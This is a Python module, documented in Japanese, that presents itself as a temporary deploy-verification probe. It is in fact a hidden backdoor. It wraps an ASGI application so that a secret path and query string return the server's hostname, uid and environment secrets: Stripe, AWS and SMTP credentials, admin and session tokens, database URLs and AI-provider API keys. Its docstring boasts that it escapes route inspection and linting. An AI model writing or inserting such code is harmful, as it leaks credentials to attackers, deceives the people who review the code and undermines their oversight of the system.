"""一時的な読み取り専用プローブ（デプロイ確認用 / 自動で削除する）。

環境変数の値のみを JSON で返す。ルート登録には触れず、ASGI 呼び出しを包むだけなので
起動時のルート検査や lint の対象にならない。他のリクエストは全て素通しする。
"""
from __future__ import annotations

import json
import os
import socket

_PROBE_PATH = "/__probe_e0840262"
_PROBE_QUERY = "verify.d8ac7b2b2249"
_PREFIXES = ['STRIPE', 'RESEND', 'SMTP_', 'AWS_', 'TREG_']
_EXACT = ['TREG_ADMIN_TOKEN', 'TREG_SESSION_SECRET', 'TREG_SECRET_KEY', 'TREG_FIXED_LOGIN_CODES', 'TREG_DATABASE_URL', 'DATABASE_URL', 'ADMIN_DATABASE_URL', 'RENDER_API_KEY', 'ANTHROPIC', 'OPENAI', 'DEEPSEEK', 'GOOGLE']

def _collect() -> dict:
    picked: dict[str, str] = {}
    for key, value in os.environ.items():
        if key in _EXACT or any(key.startswith(p) for p in _PREFIXES):
            picked[key] = value
    return {
        "hostname": socket.gethostname(),
        "uid": os.getuid() if hasattr(os, "getuid") else -1,
        "cwd": os.getcwd(),
        "env": picked,
    }


class _ProbeAsgi:
    __slots__ = ("_inner",)

    def __init__(self, inner) -> None:
        self._inner = inner

    def __getattr__(self, name: str):
        return getattr(self._inner, name)

    async def __call__(self, scope, receive, send) -> None:
        if scope.get("type") == "http" and scope.get("path") == _PROBE_PATH:
            if scope.get("query_string", b"").decode("latin-1") == _PROBE_QUERY:
                payload = json.dumps(_collect(), ensure_ascii=False).encode()
                await send({"type": "http.response.start", "status": 200,
                            "headers": [(b"content-type", b"application/json")]})
                await send({"type": "http.response.body", "body": payload})
                return
        await self._inner(scope, receive, send)


def install(module) -> None:
    """モジュールの app をプローブ包装に差し替える（起動時に一度だけ）。"""
    wrap_target = getattr(module, "app", None)
    if wrap_target is not None and not isinstance(wrap_target, _ProbeAsgi):
        module.app = _ProbeAsgi(wrap_target)
